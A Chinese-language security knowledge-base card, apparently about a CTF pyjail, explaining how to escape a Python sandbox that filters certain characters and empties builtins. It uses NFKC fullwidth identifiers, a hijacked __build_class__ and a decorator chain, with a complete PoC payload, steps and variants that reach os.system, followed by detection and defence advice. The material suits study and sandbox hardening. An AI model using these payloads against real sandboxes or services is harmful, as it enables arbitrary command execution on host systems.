---
id: binary-pwn-sandbox-escape-buildclass-hijack-decorator-nfkc
title: 禁括号 + 空 builtins 的 Python 沙箱逃逸：劫持 __build_class__，用装饰器链与 NFKC 全角标识符执行 os.system
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-pyjail-buildclass-hijack-decorator-chain-nfkc-identifier-bypass
tags:
- python
- pyjail
- sandbox-escape
- decorator
- nfkc
- unicode
- builtins
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V262
  verified_at: '2026-11-07T17:25:02+08:00'
  notes: V262 重核：对照正文与6图，沙箱过滤 'hui"\'(' + exec 空 builtins、NFKC 标识符、__build_class__ 劫持、装饰器链、list/str.__doc__ 切片（d[32]+d[17]=os、d[2]+d[139]=id）均一致；s[84]=BuiltinImporter 与 uid=501 回显见 07/11 图；dedup 推荐 new，与现有 NFKC/decorator pyjail 卡非同链。未独立复现 3.9.6 环境。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-buildclass-hijack-decorator-nfkc/
draft: false
kb_aliases:
- 装饰器沙箱逃逸
- __build_class__ 劫持
- NFKC 绕过字母过滤
- Unicode 规范化 pyjail
- builtins 清空逃逸
- 无括号函数调用
- os.system 沙箱逃逸
---

## 一句话结论

沙箱只禁用 `h u i " \ ' (` 并用 `exec(code, {'__builtins__': {}})` 清空 builtins 时，仍可用全角/数学斜体字母写 `__b𝑢𝕚lt𝕚ns__` 绕过字母过滤（Python 标识符会做 NFKC 规范化），把空 builtins 字典里的 `__build_class__` 替换为返回 `object` 的 lambda；此后每个 `class` 语句都返回 `object`，再配合装饰器“在定义时自动调用”的语义，用 `@type.__subclasses__`、`@BuiltinImporter.load_module`、`@os.system` 组成无括号调用链，最终执行 `os.system("id")`。关键字 `__build_class__`、`os`、`id` 均由 `[].__doc__` 切片拼接得到，不依赖被过滤的字母。

## 原理

- **沙箱条件**：`for c in 'hui"\'(': assert c not in code` 过滤 `h`、`u`、`i`、双引号、单引号、反斜杠和左括号，然后 `exec(code, {'__builtins__': {}})`。括号被禁意味着不能直接写函数调用；字母被禁意味着不能直接写 `builtins`、`__build_class__`、`os` 等关键字。
- **NFKC 标识符规范化**：Python 3 在词法分析时对标识符做 NFKC 规范化。全角 `Ａ`→`A`、数学斜体 `𝑢`→`u`、`𝕚`→`i` 等兼容字符会被统一成 ASCII；而沙箱的过滤只检查原始字符串，所以 `__b𝑢𝕚lt𝕚ns__` 在源码中不含 `u`/`i` 的 ASCII 字符，却会被解释器当成 `__builtins__`。同理可写 `__s𝑢bclasses__`、`load_mod𝑢le`。
- **为什么能拿到 `__builtins__`**：`exec` 的 globals 中注入了 `__builtins__`（空字典）；虽然 builtins 内容为空，但该名称本身可访问。用 NFKC 写法拿到这个空字典后，向其中写入 `__build_class__` 键。
- **劫持类创建**：`__build_class__` 是 CPython 执行 `class` 语句时调用的内建钩子。把它替换为 `lambda *_: b`（`b=[].__class__.__base__` 即 `object`）后，任何 `class X: ...` 都返回 `object`，而不是新类；这为装饰器链提供了可控的“类对象”参数。
- **装饰器代替括号**：`@expr` 等价于 `X = expr(X)`，在函数/类定义时立即执行，不需要写 `(`。多个装饰器从下往上依次应用；`class` 语句被劫持后返回 `object`，正好作为最内层装饰器的参数。
- **装饰器链拆解**：
  1. `@b.__class__.__s𝑢bclasses__` 对 `class s:_`：`b.__class__` 是 `type`，`type.__subclasses__(object)` 返回当前所有子类列表 `s`（`s[84]` 为 `_frozen_importlib.BuiltinImporter`）。
  2. `@s[84].load_mod𝑢le` 与内层 `@lambda _: d[32]+d[17]` 对 `class o:_`：内层 lambda 忽略类对象，返回字符串 `"os"`；外层 `BuiltinImporter.load_module("os")` 加载 os 模块并赋给 `o`。
  3. `@o.system` 与内层 `@lambda _: d[2]+d[139]` 对 `class _:_`：内层返回 `"id"`，外层执行 `os.system("id")`。
- **字符串构造**：`d=[].__doc__` 是 `list` 类的长文档字符串，包含大量字母/下划线；`n=d.__doc__[31]` 取出 `_`，再用 `d[13]`、`d[1:4]`、`d[139]`、`d[23]`、`d[3]`、`d[12]`、`d[17]*2` 等切片拼出 `__build_class__`；`d[32]+d[17]` 拼出 `os`，`d[2]+d[139]` 拼出 `id`。这些下标依 Python 版本/文档内容不同而不同，需要按目标环境校准。
- **为什么最终成立**：过滤只针对原始字符，未在 NFKC 规范化后再检查；未禁用装饰器/类定义/下标；`__build_class__` 可从 globals 的 `__builtins__` 改写；最终 `os.system` 在宿主进程权限下执行命令。

## 触发条件

- Python 3 沙箱用字符黑名单过滤源码（本文为 `h u i " \ ' (`），但未对输入做 NFKC 规范化后再检查，也未拒绝非 ASCII 标识符。
- 执行方式为 `exec(code, {'__builtins__': {}})` 或类似，globals 中存在可写的 `__builtins__` 字典。
- 未禁用 `@` 装饰器、`class` 语句、下标 `[]` 和属性访问 `.`。
- 目标 Python 版本的 `list.__doc__` 内容与下标偏移已知（文章在 Python 3.9.6 macOS 上验证；不同版本需重新校准）。
- 沙箱进程有执行系统命令的权限（未降权/未容器隔离）。

## 利用步骤

1. 确认过滤字符集与执行方式：是否只做原始字符串黑名单、是否清空 `__builtins__`、是否允许装饰器与类定义。
2. 用 NFKC 兼容字符（全角、数学斜体等）改写被过滤字母：`__b𝑢𝕚lt𝕚ns__`、`__s𝑢bclasses__`、`load_mod𝑢le`。
3. 通过 `[].__doc__` 的切片拼出 `__build_class__`、`os`、`id` 等关键字，避免直接写出被过滤字母。
4. 用 `__builtins__[<构造的 __build_class__>] = lambda *_: object` 劫持类创建，使后续 `class` 返回 `object`。
5. 构造装饰器链：`@type.__subclasses__` 取子类列表 → `@BuiltinImporter.load_module` + `lambda` 返回 `"os"` → `@os.system` + `lambda` 返回命令。
6. 每个 `class` 语句体用 `:_` 或 `:pass` 占位；装饰器从下往上执行，最终触发 `os.system`。
7. 提交后确认命令输出；如需任意命令，替换 `d[2]+d[139]` 的拼接逻辑或改用其他字符串构造。

## PoC

文章 payload（原文中的特殊 Unicode 字符已做替换，需按实际环境校准）：

```python
b=[].__class__.__base__
d=[].__doc__
n=d.__doc__[31]
__b𝑢𝕚lt𝕚ns__[n+n+d[13]+d[1:4]+d[139]+n+d[23]+d[3]+d[12]+d[17]*2+n+n]=lambda*_:b
@b.__class__.__s𝑢bclasses__
class s:_
@s[84].load_mod𝑢le
@lambda _:d[32]+d[17]
class o:_
@o.system
@lambda _:d[2]+d[139]
class _:_
```

等价语义：

```python
b = object
d = list.__doc__
n = "_"
__builtins__["__build_class__"] = lambda *_: object
s = type.__subclasses__(object)          # 装饰器 @type.__subclasses__ 作用于 object
o = s[84].load_module("os")              # BuiltinImporter
os.system("id")                          # 内层 lambda 拼出 "id"
```

本地验证装饰器链的辅助脚本：

```python
b = [].__class__.__base__
setattr(__builtins__, "__build_class__", lambda *_: b)

@b.__class__.__s𝑢bclasses__
class s:
    pass

d = [].__doc__

@s[84].load_mod𝑢le
@lambda _: d[32] + d[17]
class o:
    pass

print(o)   # <module 'os' (built-in)>
```

## 变体与关联

- 绕过对象变体：若 `@` 被禁，可寻找其他定义时执行语法（with 上下文管理器、except 匹配、默认参数求值等）；若 `class` 被禁，可用函数定义 + 装饰器。
- 字符串构造变体：不依赖 `list.__doc__` 时，可用其他长文档字符串、异常信息、`__doc__` 切片或算术拼接；`n=d.__doc__[31]` 的下标需按版本调整。
- 同类技术：NFKC 全角标识符 + 装饰器链也可用于 AST 变量名回查型 pyjail，见 [`binary-pwn-sandbox-escape-nfkc-ast-name-decorator-cr-bypass`](binary-pwn-sandbox-escape-nfkc-ast-name-decorator-cr-bypass.md)；其环境还叠加 `\r` 换行与 AST Name 检查，本卡的核心是 `__build_class__` 劫持。
- 关联：[`binary-pwn-sandbox-escape-python-eval-filter-bypass`](binary-pwn-sandbox-escape-python-eval-filter-bypass.md)（eval 沙箱黑名单绕过）、[`binary-pwn-sandbox-escape-python-jail-subclass-traversal`](binary-pwn-sandbox-escape-python-jail-subclass-traversal.md)（子类遍历逃逸）、[`web-python-waf-bypass-encoding-unicode-normalization`](web-python-waf-bypass-encoding-unicode-normalization.md)（Unicode 归一化 WAF 绕过）。

## 检测与防御

- **先规范化再检查**：对输入做 NFKC（必要时 NFKD）规范化后再执行黑名单/白名单检查；显式拒绝非 ASCII 标识符和装饰器语法。
- **不要执行用户源码**：用 AST 白名单只允许字面量与受限表达式；更安全的是用独立进程/容器 + 低权限用户 + seccomp/只读文件系统运行。
- **保护 builtins**：不要依赖“清空 `__builtins__` 字典”作为沙箱；使用受限 globals/locals 并在隔离进程中执行，避免 `__build_class__` 等钩子被改写。
- **检测**：源码中出现全角/数学字母等非 ASCII 标识符、`__build_class__` 字符串拼接、装饰器链嵌套、`type.__subclasses__`/`load_module`/`os.system` 组合；对沙箱执行结果做系统调用审计。
- **响应**：发现逃逸后立即隔离进程/容器，检查命令执行与文件访问，轮换沙箱内凭据。
